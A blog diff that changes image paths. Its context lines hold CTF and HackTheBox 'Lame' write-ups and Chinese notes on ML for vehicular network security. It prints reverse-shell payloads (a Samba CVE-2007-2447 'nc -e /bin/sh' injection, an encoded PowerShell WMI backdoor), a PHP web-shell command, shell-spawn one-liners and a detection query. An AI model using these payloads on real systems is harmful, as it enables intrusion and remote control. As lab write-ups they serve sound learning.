 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/kali/Desktop]</span><br><span class="line">└──╼ <span class="comment">#fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt luggage.zip </span></span><br><span class="line">found file <span class="string">'flag.txt'</span>, (size <span class="built_in">cp</span>/uc     68/    56, flags 1, chk f38c)</span><br><span class="line">                        </span><br><span class="line">PASSWORD FOUND!!!!: pw == 7123</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="img/metactfimage20.png" alt="image.png"></p>
+<p><img src="/img/metactfimage20.png" alt="image.png"></p>
 <hr>
 <p>What’s better than RSA? 1024 runs of RSA!</p>
 <p>We encrypted the flag using <a target="_blank" rel="noopener" href="https://metaproblems.com/b7efc6dbe8b30f0d5d1a1f333297fbda/loopy_primes.py">this program</a>, and the output from running the program with the <a target="_blank" rel="noopener" href="https://metaproblems.com/b7efc6dbe8b30f0d5d1a1f333297fbda/output.txt">flag</a> is available here.</p>
@@ -943,7 +943,7 @@ mjx-container[display="true"] + br {
 </blockquote>
 <hr>
 <p>The Federal Bureau of Elfvestigation caught this suspicious letter in the mail, can you decode it to make sure nothing nefarious is going on? Here’s a photocopy of the letter.</p>
-<p><img src="img/metactff.png" alt="metactff.png"></p>
+<p><img src="/img/metactff.png" alt="metactff.png"></p>
 <p><a target="_blank" rel="noopener" href="https://rumkin.com/tools/cipher/atbash/">https://rumkin.com/tools/cipher/atbash/</a></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Wvzi Hsrmmb Fkzgivv,</span><br><span class="line"></span><br><span class="line">Slkv blf<span class="string">'iv szermt z nviib wzb! R'</span>n <span class="built_in">rm</span> z yrg lu z hgrxpb hrgfzgrlm</span><br><span class="line">zmw xlfow ivzoob fhv blfi svok.</span><br><span class="line"></span><br><span class="line">Hl, Hftzikofn Nzib nzwv gsvhv znzarmt givzgh uli gsv luurxv</span><br><span class="line">kzigb, zmw, dvoo, R xlfowm<span class="string">'g ivhrhg. R vmwvw fk vzgrmt zoo lu gsvn!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Mld gsviv'</span>h mlgsrmt ovug uli gsv kzigb, zmw R<span class="string">'n rm z yrg lu z qzn</span></span><br><span class="line"><span class="string">(mlg fmorpv gsv uroovw wlmfgh szsz). R mvvw gl hlig gsrh lfg yvuliv</span></span><br><span class="line"><span class="string">Hftzikofn Nzib li Hzmgz urmw lfg, li gsv kzigb'</span>h tlrmt gl yv z </span><br><span class="line">wrhzhgvi.</span><br><span class="line"></span><br><span class="line">Wl blf szev zmb rwvzh li girxph fk blfi hovvev gl svok nv</span><br><span class="line">dsrk fk hlnv mvd givzgh <span class="built_in">rm</span> grnv? R pmld R xzm xlfmg lm blf gl </span><br><span class="line">pvvk gsrh yvgdvvm fh.</span><br><span class="line"></span><br><span class="line">R vmxibkgvw gsrh nvhhztv drgs zgyzhs, hl slkvufoob nb orggov</span><br><span class="line">hvxivg rh hzuv.</span><br><span class="line"></span><br><span class="line">Gszmph z glm uli yvrmt hfxs z tivzg uirvmw. R ldv blf lmv!</span><br><span class="line"></span><br><span class="line">Xsvvih,</span><br><span class="line">Yfhsb Vevitivvm</span><br><span class="line"></span><br><span class="line">K.H. Gszg xlwv blf dviv zhprmt zylfg gl fmolxp gsv wvevolknvmg nlwv </span><br><span class="line">uli gsv Nztrxzo Rmufhrlm Nzxsrmv, N2C24 rh </span><br><span class="line">NvgzXGU{ylgs_givzgh_zmw_nvhhztvh_hglovm}, slkv gszg svokh!</span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Dear Shinny Upatree,</span><br><span class="line"></span><br><span class="line">Hope you<span class="string">'re having a merry day! I'</span>m <span class="keyword">in</span> a bit of a sticky situation</span><br><span class="line">and could really use your <span class="built_in">help</span>.</span><br><span class="line"></span><br><span class="line">So, Sugarplum Mary made these amazing treats <span class="keyword">for</span> the office</span><br><span class="line">party, and, well, I couldn<span class="string">'t resist. I ended up eating all of them!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now there'</span>s nothing left <span class="keyword">for</span> the party, and I<span class="string">'m in a bit of a jam</span></span><br><span class="line"><span class="string">(not unlike the filled donuts haha). I need to sort this out before</span></span><br><span class="line"><span class="string">Sugarplum Mary or Santa find out, or the party'</span>s going to be a </span><br><span class="line">disaster.</span><br><span class="line"></span><br><span class="line">Do you have any ideas or tricks up your sleeve to <span class="built_in">help</span> me</span><br><span class="line">whip up some new treats <span class="keyword">in</span> <span class="keyword">time</span>? I know I can count on you to </span><br><span class="line">keep this between us.</span><br><span class="line"></span><br><span class="line">I encrypted this message with atbash, so hopefully my little</span><br><span class="line">secret is safe.</span><br><span class="line"></span><br><span class="line">Thanks a ton <span class="keyword">for</span> being such a great friend. I owe you one!</span><br><span class="line"></span><br><span class="line">Cheers,</span><br><span class="line">Bushy Evergreen</span><br><span class="line"></span><br><span class="line">P.S. That code you were asking about to unlock the development mode </span><br><span class="line"><span class="keyword">for</span> the Magical Infusion Machine, M2X24 is </span><br><span class="line">MetaCTF{both_treats_and_messages_stolen}, hope that helps!</span><br></pre></td></tr></table></figure>
@@ -953,7 +953,7 @@ mjx-container[display="true"] + br {
 <p><a target="_blank" rel="noopener" href="https://github.com/davidpany/WMI_Forensics">https://github.com/davidpany/WMI_Forensics</a></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/Repository]</span><br><span class="line">└─# <span class="built_in">cd</span> WMI_Forensics                </span><br><span class="line">                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/Repository/WMI_Forensics]</span><br><span class="line">└─# python2 CCM_RUA_Finder.py -i ../OBJECTS.DATA -o out.xls</span><br><span class="line">                100% complete...                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/Repository/WMI_Forensics]</span><br><span class="line">└─# python2 PyWMIPersistenceFinder.py ../OBJECTS.DATA            </span><br><span class="line"></span><br><span class="line">    Enumerating FilterToConsumerBindings...</span><br><span class="line">    2 FilterToConsumerBinding(s) Found. Enumerating Filters and Consumers...</span><br><span class="line"></span><br><span class="line">    Bindings:</span><br><span class="line"></span><br><span class="line">        PowershellMemoryCapture-PowerShellProcessStarted</span><br><span class="line">            Consumer: </span><br><span class="line">                Consumer Type: CommandLineEventConsumer</span><br><span class="line">                Arguments:     powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIANAAwAC4AMQAiACwANAA5ADUAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAIgBNAGUAdABhAEMAVABGAHsAMQBfAGgANAB2ADMAXwBAAF8AYgA0AGMAawBjAGgAMQBtAG4AMwB5AF8ANABfAHkAMAB1AH0AIgAgACsAIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==</span><br><span class="line">                Consumer Name: PowershellMemoryCapture</span><br><span class="line"></span><br><span class="line">            Filter: </span><br><span class="line">                Filter name:  PowerShellProcessStarted</span><br><span class="line">                Filter Query: SELECT FileName, ProcessID FROM Win32_ModuleLoadTrace WHERE FileName LIKE <span class="string">"%System.Management.Automation%.dll"</span></span><br><span class="line"></span><br><span class="line">        SCM Event Log Consumer-SCM Event Log Filter</span><br><span class="line">                (Common binding based on consumer and filter names, possibly legitimate)</span><br><span class="line">            Consumer: NTEventLogEventConsumer ~ SCM Event Log Consumer ~ sid ~ Service Control Manager</span><br><span class="line"></span><br><span class="line">            Filter: </span><br><span class="line">                Filter name:  SCM Event Log Filter</span><br><span class="line">                Filter Query: <span class="keyword">select</span> * from MSFT_SCMEventLogEvent</span><br><span class="line"></span><br><span class="line">    Thanks <span class="keyword">for</span> using PyWMIPersistenceFinder! Please contact @DavidPany with questions, bugs, or suggestions.</span><br><span class="line"></span><br><span class="line">    Please review FireEye<span class="string">'s whitepaper for additional WMI persistence details:</span></span><br><span class="line"><span class="string">        https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf</span></span><br><span class="line"><span class="string">                                                                                                                                       </span></span><br></pre></td></tr></table></figure>
 <p>把base64解ㄌ</p>
-<p><img src="img/metactff1.png" alt="metactff.png"></p>
+<p><img src="/img/metactff1.png" alt="metactff.png"></p>
 <p>flag在裡面</p>
 <blockquote>
 <p>MetaCTF{1<em>h4v3</em>@_b4ckch1mn3y_4_y0u}</p>
@@ -963,7 +963,7 @@ mjx-container[display="true"] + br {
 <p>Santa wants to spread holiday cheer, but doesn’t want to rely on other websites for photo sharing. He’s building a new website to allow children to upload their holiday photos! Maybe check it out to make sure it’s secure…</p>
 <p>Download the source code for the website here.</p>
 <p>Your URL is <a target="_blank" rel="noopener" href="http://l5fqfkfbfkm8.chals.mctf.io/">http://l5fqfkfbfkm8.chals.mctf.io</a></p>
-<p><img src="img/metactff2.png" alt="metactff.png"></p>
+<p><img src="/img/metactff2.png" alt="metactff.png"></p>
 <p>檢查拿到的程式</p>
 <p>在 <code>upload.php</code> 的代碼中，上傳的文件沒有進行嚴格的檢查和限制：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">"metactff"</span>][<span class="string">"tmp_name"</span>], <span class="variable">$target_file</span>)) {</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;div class='alert alert-success mt-3'&gt;Your photo has been uploaded!&lt;/div&gt;"</span>;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;div class='alert alert-danger mt-3'&gt;There was an error uploading your file.&lt;/div&gt;"</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -978,9 +978,9 @@ mjx-container[display="true"] + br {
 </ul>
 <p>透過原始碼知道他所有文件上傳到metactffs</p>
 <p>不知道flag位置沒問題，直接查找，因為上傳的exploit讓我們可以發動任意指令</p>
-<p><img src="img/metactff3.png" alt="metactff.png"></p>
+<p><img src="/img/metactff3.png" alt="metactff.png"></p>
 <p><a target="_blank" rel="noopener" href="http://l5fqfkfbfkm8.chals.mctf.io/metactffs/exp.php?cmd=cat/var/www/html/flag.txt">http://l5fqfkfbfkm8.chals.mctf.io/metactffs/exp.php?cmd=cat /var/www/html/flag.txt</a></p>
-<p><img src="img/metactff4.png" alt="metactff.png"></p>
+<p><img src="/img/metactff4.png" alt="metactff.png"></p>
 <blockquote>
 <p>GIF89aMetaCTF{ph3ar_d3s3rial1z3d_0bj3cts} MetaCTF{ph3ar_d3s3rial1z3d_0bj3cts}</p>
 </blockquote>
@@ -1047,11 +1047,11 @@ mjx-container[display="true"] + br {
 </li>
 <li>nmap -p 1-65535 -T4 -A -v 10.129.108.1</li>
 </ul>
-<p><img src="img/lame_Untitled.png" alt="Untitled"></p>
-<p><img src="img/lame_Untitled_1.png" alt="Untitled"></p>
-<p><img src="img/lame_Untitled_2.png" alt="Untitled"></p>
-<p><img src="img/lame_Untitled_3.png" alt="Untitled"></p>
-<p><img src="img/lame_Untitled_4.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_1.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_2.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_3.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_4.png" alt="Untitled"></p>
 <p>Now we can see the open port is:</p>
 <ul>
 <li>21/tcp vsftpd 2.3.4 ftp service</li>
@@ -1059,9 +1059,9 @@ mjx-container[display="true"] + br {
 <li>445/tcp Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)  netbios-ssn</li>
 </ul>
 <p>One of the FTP services allows guests to login</p>
-<p><img src="img/lame_Untitled_5.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_5.png" alt="Untitled"></p>
 <p>So I try using anonymous login FTP service，but the content is empty</p>
-<p><img src="img/lame_Untitled_6.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_6.png" alt="Untitled"></p>
 <p>Then I decided to look for vulnerabilities in this service version</p>
 <p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49757">Offensive Security’s Exploit Database Archive</a></p>
 <p>The exploit-db  platform has seen this version of the vulnerability message </p>
@@ -1076,11 +1076,11 @@ mjx-container[display="true"] + br {
 <p><a target="_blank" rel="noopener" href="https://www.cvedetails.com/vulnerability-list/vendor_id-97/product_id-585/version_id-430455/Openbsd-Openssh-4.7p1.html">Openbsd Openssh version 4.7p1 : Security vulnerabilities</a></p>
 <p>After searching for vulnerabilities in this version of SSH, I found no exploitable vulnerabilities, so I directly tested the SMB service</p>
 <p>The SMB service has two ports opened</p>
-<p><img src="img/lame_Untitled_7.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_7.png" alt="Untitled"></p>
 <p>When I browsed the exploit-db platform again, I found a lot of exploitable vulnerability information after looking for the Samba service. Among them, the 445 port targeted the vulnerability of smbd 3.0.20, and I also saw this vulnerability exploit information in the platform list.</p>
 <p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/16320">Offensive Security’s Exploit Database Archive</a></p>
-<p><img src="img/lame_Untitled_8.png" alt="Untitled"></p>
-<p><img src="img/lame_Untitled_9.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_8.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_9.png" alt="Untitled"></p>
 <p>You can see that the CVE number is 2007-2447</p>
 <p><a target="_blank" rel="noopener" href="https://www.samba.org/samba/security/CVE-2007-2447.html">Samba - Security Announcement Archive</a></p>
 <p>The exploit needs to import the suite first from smb.SMBConnection import SMBConnection</p>
@@ -1094,26 +1094,26 @@ mjx-container[display="true"] + br {
 <p>So I decided not to test this way</p>
 <p>(Here I changed the IP)</p>
 <p>first I want to know the smb service if I use Anonymous identity to login the SMB it can be access?</p>
-<p><img src="img/lame_Untitled_10.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_10.png" alt="Untitled"></p>
 <p>as i guessed</p>
 <p>The smb exploit</p>
 <ul>
 <li>logon “/=<code>nc ‘tun0 interface IP’ 4444 -e /bin/bash</code>”</li>
 </ul>
-<p><img src="img/lame_Untitled_11.png" alt="Untitled"></p>
-<p><img src="img/lame_Untitled_12.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_11.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_12.png" alt="Untitled"></p>
 <p>I think this method is Failed</p>
 <p>So want to try other payload</p>
 <p><a target="_blank" rel="noopener" href="https://oscp.infosecsanyam.in/untitled/smb-enumeration">SMB Enumeration</a></p>
 <ul>
 <li><p>logon “./=<code>nohup nc -e /bin/sh LHOST LPORT</code>“</p>
-<p>  <img src="img/lame_Untitled_13.png" alt="Untitled"></p>
+<p>  <img src="/img/lame_Untitled_13.png" alt="Untitled"></p>
 </li>
 </ul>
 <p>when I use this payload, the nc well return the <strong>connect to [10.10.14.9] from (UNKNOWN) [10.129.109.152] 39109</strong> message to me</p>
-<p><img src="img/lame_Untitled_14.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_14.png" alt="Untitled"></p>
 <p>So I decide to try some command under nc</p>
-<p><img src="img/lame_Untitled_15.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_15.png" alt="Untitled"></p>
 <p>In order to be fully interactive in this simple reverse shell environment, I use the interactive terminal generated by Python</p>
 <ul>
 <li><p>TTY</p>
@@ -1133,15 +1133,15 @@ mjx-container[display="true"] + br {
 <li>lua: os.execute(‘/bin/sh’)</li>
 <li>exec “/bin/sh”</li>
 </ul>
-<p><img src="img/lame_Untitled_16.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_16.png" alt="Untitled"></p>
 <h3 id="Rule-query"><a href="#Rule-query" class="headerlink" title="Rule query"></a>Rule query</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">event.action:executed and process.name:python and</span><br><span class="line">process.args:(&quot;import pty; pty.spawn(\&quot;/bin/sh\&quot;)&quot; or &quot;import pty;</span><br><span class="line">pty.spawn(\&quot;/bin/dash\&quot;)&quot; or &quot;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&quot;)</span><br></pre></td></tr></table></figure>
 <p>when I execution python -c ‘import pty; pty.spawn(“/bin/sh”)’ </p>
 <p>I well got the fully interactive, it let me easy to operate</p>
-<p><img src="img/lame_Untitled_17.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_17.png" alt="Untitled"></p>
 <ul>
 <li>cat /root/root.txt ⇒ ffed091dd44f75f11cb90d85bb1ca752</li>
 </ul>
-<p><img src="img/lame_Untitled_18.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_18.png" alt="Untitled"></p>
 <p>To be honest, I searched for flag’s file for a long time, because it doesn’t have a fixed file name and location.</p>
 
       
@@ -1198,7 +1198,7 @@ mjx-container[display="true"] + br {
       
         <h1 id="Machine-Learning-for-Security-in-Vehicular-Net-works-A-Comprehensive-Survey"><a href="#Machine-Learning-for-Security-in-Vehicular-Net-works-A-Comprehensive-Survey" class="headerlink" title="Machine_Learning_for_Security in_Vehicular_Net_works_A_Comprehensive_Survey"></a>Machine_Learning_for_Security in_Vehicular_Net_works_A_Comprehensive_Survey</h1><p>車聯網資安調查 upstream security <a target="_blank" rel="noopener" href="https://upstream.auto/">https://upstream.auto/</a></p>
 <p>標題：車輛網絡安全機器學習技術綜合調查</p>
-<p><img src="img/vehicle_Untitled.png" alt="Structure of this Survey"></p>
+<p><img src="/img/vehicle_Untitled.png" alt="Structure of this Survey"></p>
 <p>Structure of this Survey</p>
 <p>介紹：</p>
 <ul>
@@ -1217,7 +1217,7 @@ mjx-container[display="true"] + br {
 <p>中間人 (MitM) 攻擊Man-in-the-middle (MitM) attacks：MitM 攻擊涉及攔截兩方之間的通信並將其更改為惡意目的。</p>
 </blockquote>
 </blockquote>
-<p><img src="img/vehicle_Untitled_1.png" alt="Taxonomy of attacks in vehicular network"></p>
+<p><img src="/img/vehicle_Untitled_1.png" alt="Taxonomy of attacks in vehicular network"></p>
 <p>Taxonomy of attacks in vehicular network</p>
 <div class="table-container">
 <table>
@@ -1274,7 +1274,7 @@ mjx-container[display="true"] + br {
 <li>Spamming Attack : 在這種攻擊中，攻擊者發送大量垃圾郵件以消耗網絡帶寬並增加數據傳輸的延遲。</li>
 <li>Jamming Attack : 在這種攻擊中，干擾器的目的是通過佔用信道或發送虛假警報來阻止或乾擾授權傳輸。</li>
 <li><p>Grey-Hole and Black-Hole Attack : 黑洞和灰洞攻擊是無線路由攻擊的類型。 在這些攻擊中，節點試圖停止向接收方轉發消息/數據包。 在黑洞攻擊中，將完全中斷或丟包。 然而，在灰洞攻擊中，會發生部分數據包丟失，部分數據包被攻擊者更改以向接收方傳達錯誤信息。</p>
-<p><img src="img/vehicle_Untitled_2.png" alt="Untitled"></p>
+<p><img src="/img/vehicle_Untitled_2.png" alt="Untitled"></p>
 </li>
 <li><p>Man-in-the-Middle (MiTM) Attack : 在 MiTM 中，攻擊者通過攔截信道聽到兩個節點之間正在進行的通信，並假裝是其中之一以錯誤信息回复。</p>
 </li>
@@ -1310,7 +1310,7 @@ mjx-container[display="true"] + br {
 <p>目標是學習一種策略，幫助代理在給定環境中採取最佳行動 [118]。 代理根據收到的獎勵生成要學習的數據，並嘗試通過使用試錯法與環境交互來最大化正獎勵。 環境是一個Markov decision process，其中獎勵和狀態轉移概率由觀察和動作選擇定義 [21]。 RL 的策略是找到最大化未來獎勵的動作。<br> 最流行和廣泛使用的 RL 方法之一是 Q-learning。 Q-learning 使用 Bellman equation作為約束來最大化累積獎勵 [118]。 它旨在通過應用動作選擇策略來最大化預期的獎勵總和。</p>
 <p>在實踐中，Q-learning 會生成一個查找表來存儲動作和預期獎勵的組合。 這需要更大的內存，並且當對數據使用一組連續的操作時，有時會變得效率低下。 作為解決方案，提出了 DRL 網絡，它涉及 DL 和 RL 的組合以處理更大的數據集 [119]。RL、DRL 及其變體的使用被廣泛用於車載網絡的安全性。</p>
 </blockquote>
-<p><img src="img/vehicle_Untitled_3.png" alt="The conceptual framework of RL"></p>
+<p><img src="/img/vehicle_Untitled_3.png" alt="The conceptual framework of RL"></p>
 <p>The conceptual framework of RL</p>
 </li>
 <li><p>深度學習Deep learning：深度學習算法如卷積神經網絡（CNNs）和遞歸神經網絡（RNNs）可用於分析大量數據並做出準確的預測或決策。</p>
@@ -1333,13 +1333,13 @@ mjx-container[display="true"] + br {
 </li>
 <li>集成方法Ensemble methods：集成方法如隨機森林或梯度提升可以結合多個 ML 模型以提高accuracy and robustness。</li>
 <li><p>遷移學習Transfer learning：遷移學習技術可以利用預先訓練的模型或來自相關領域的知識來提高 ML 模型在檢測攻擊方面的性能。</p>
-<p> <img src="img/vehicle_Untitled_4.png" alt="The conceptual framework of TL"></p>
+<p> <img src="/img/vehicle_Untitled_4.png" alt="The conceptual framework of TL"></p>
 <p> The conceptual framework of TL</p>
 </li>
 <li><p>聯邦學習Federated learning : FL 是一種分佈式機器學習技術，它使多方能夠協作訓練模型而無需彼此共享數據。 在車載網絡環境中，FL 可用於訓練模型以檢測攻擊或異常，同時保護個別車輛生成的敏感數據的隱私。</p>
-<p><img src="img/vehicle_Untitled_5.png" alt="The conceptual framework of FL"></p>
+<p><img src="/img/vehicle_Untitled_5.png" alt="The conceptual framework of FL"></p>
 <p>The conceptual framework of FL</p>
-<p><img src="img/vehicle_Untitled_6.png" alt="ML-BASED LITERATURE TO DETECT OR PREVENT ADVERSARIES AT
+<p><img src="/img/vehicle_Untitled_6.png" alt="ML-BASED LITERATURE TO DETECT OR PREVENT ADVERSARIES AT
 DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <p>ML-BASED LITERATURE TO DETECT OR PREVENT ADVERSARIES AT<br>DIFFERENT LEVELS OF COMMUNICATIONS</p>
 </li>
@@ -1362,7 +1362,7 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 
 </li>
 </ul>
-<p><img src="img/vehicle_Untitled_7.png" alt="The conceptual block diagram of a typical ML model."></p>
+<p><img src="/img/vehicle_Untitled_7.png" alt="The conceptual block diagram of a typical ML model."></p>
 <p>The conceptual block diagram of a typical ML model.</p>
 <p>車載網絡基礎：</p>
 <ul>
@@ -1371,9 +1371,9 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <p>網絡架構：本文討論了支持車輛網絡中智能交通應用的不同網絡架構。 其中包括 5G、軟體定義網絡 (SDN)、物聯網 (IoT)、邊緣計算和雲計算。</p>
 <p>車輛網絡的變體：本文討論了車輛網絡的不同變體，包括車輛對車輛 (V2V) 通信、車輛對基礎設施 (V2I) 通信和車輛對一切 (V2X) 通信。</p>
 </blockquote>
-<p>  <img src="img/vehicle_Untitled_8.png" alt="Variants of vehicular networks and related work"></p>
+<p>  <img src="/img/vehicle_Untitled_8.png" alt="Variants of vehicular networks and related work"></p>
 <p>  Variants of vehicular networks and related work</p>
-<p>  <img src="img/vehicle_Untitled_9.png" alt="VEHICULAR NETWORK VARIANTS AND ADVANTAGES"></p>
+<p>  <img src="/img/vehicle_Untitled_9.png" alt="VEHICULAR NETWORK VARIANTS AND ADVANTAGES"></p>
 <p>  VEHICULAR NETWORK VARIANTS AND ADVANTAGES</p>
 <blockquote>
 <p>用於數據傳輸的通信類型：本文討論了用於車載網絡數據傳輸的不同通信類型。 其中包括專用短程通信 (DSRC)、蜂窩車聯網 (C-V2X) 和 IEEE 802.11p。</p>
@@ -1387,13 +1387,13 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <li>隱私Privacy :  隱私是車載網絡安全的一項極其重要的要求。 它是一種保護車輛敏感信息免受攻擊者攻擊的方法。 在車載網絡的上下文中，它進一步分為位置隱私和用戶隱私。 駕駛員/車輛的位置和身份非常敏感，必須對攻擊者隱藏。 然而，可信機構必須知道位置信息以提供更好的服務。 有許多基於用戶位置向用戶提供服務的 LBS。 在這種情況下，保護位置的隱私免受攻擊者的攻擊，同時確保其對服務提供實體的安全可用性是非常具有挑戰性的 [16]。</li>
 <li>身份驗證Authentication : 在向系統請求任何服務之前，車輛總是會向系統驗證自己的身份。 有兩種類型的認證，消息認證和節點認證。 當車輛成為任何新網絡的一部分時，它會通過網絡驗證其節點信息（即身份、地址和相關信息）。 這有助於系統區分合法節點和惡意節點。 但是，當消息在兩輛車之間傳輸時，必須對其進行身份驗證以確保完整性。 無法維護車載網絡安全的第一步可能會導致網絡完全損壞。</li>
 <li><p>信任Trust : 是安全的一個重要方面，用於增強系統對攻擊者的保護級別。 信任可以歸類為一個實體對屬於同一組網絡的另一個實體的信念。 在車載網絡中，信任計算是安全要求的附加步驟，與隱私保護、可用性和密鑰管理一起使用，以確保數據的高度安全傳輸 [14]。 文獻中存在信任計算方案（在面向實體和麵向數據的背景下），它利用網絡中車輛的歷史交互將其分類為可信的 [97]。 在車載網絡中，通過執行信任計算作為基本安全要求來確保車輛之間的誠實非常重要</p>
-<p><img src="img/vehicle_Untitled_10.png" alt="Security requirements and ML-based literature"></p>
+<p><img src="/img/vehicle_Untitled_10.png" alt="Security requirements and ML-based literature"></p>
 <p>Security requirements and ML-based literature</p>
 </li>
 </ul>
 </li>
 </ul>
-<p><img src="img/vehicle_Untitled_11.png" alt="V2X RF Vulnerabilities and Attack Vectors"></p>
+<p><img src="/img/vehicle_Untitled_11.png" alt="V2X RF Vulnerabilities and Attack Vectors"></p>
 <p>V2X RF Vulnerabilities and Attack Vectors</p>
 </blockquote>
 </li>
@@ -1402,31 +1402,31 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <ul>
 <li>討論了不同的 ML 方法，例如監督學習、無監督學習和強化學習。</li>
 </ul>
-<p><img src="img/vehicle_Untitled_12.png" alt="ML TECHNIQUES APPLIED TO VEHICULAR SECURITY"></p>
+<p><img src="/img/vehicle_Untitled_12.png" alt="ML TECHNIQUES APPLIED TO VEHICULAR SECURITY"></p>
 <p>ML TECHNIQUES APPLIED TO VEHICULAR SECURITY</p>
 <ul>
 <li>深度學習、決策樹、支持向量機 (SVM) 和隨機森林是一些常用的 ML 技術。</li>
 </ul>
-<p><img src="img/vehicle_Untitled_13.png" alt="ML approaches in the context of vehicular network security"></p>
+<p><img src="/img/vehicle_Untitled_13.png" alt="ML approaches in the context of vehicular network security"></p>
 <p>ML approaches in the context of vehicular network security</p>
 <p>文獻綜述：</p>
 <ul>
 <li>本文回顧了使用 ML 策略提供不同安全和隱私解決方案的文獻。</li>
 <li>它簡要解釋和比較了不同的解決方案，並提供了解決方案的表格形式。</li>
 </ul>
-<p><img src="img/vehicle_Untitled_14.png" alt="COMPARISON OF SURVEYS ON ML AND/OR SECURITY IN VEHICULAR NETWORKS"></p>
+<p><img src="/img/vehicle_Untitled_14.png" alt="COMPARISON OF SURVEYS ON ML AND/OR SECURITY IN VEHICULAR NETWORKS"></p>
 <p>COMPARISON OF SURVEYS ON ML AND/OR SECURITY IN VEHICULAR NETWORKS</p>
-<p><img src="img/vehicle_Untitled_15.png" alt="Security solutions and ML-based literature."></p>
+<p><img src="/img/vehicle_Untitled_15.png" alt="Security solutions and ML-based literature."></p>
 <p>Security solutions and ML-based literature.</p>
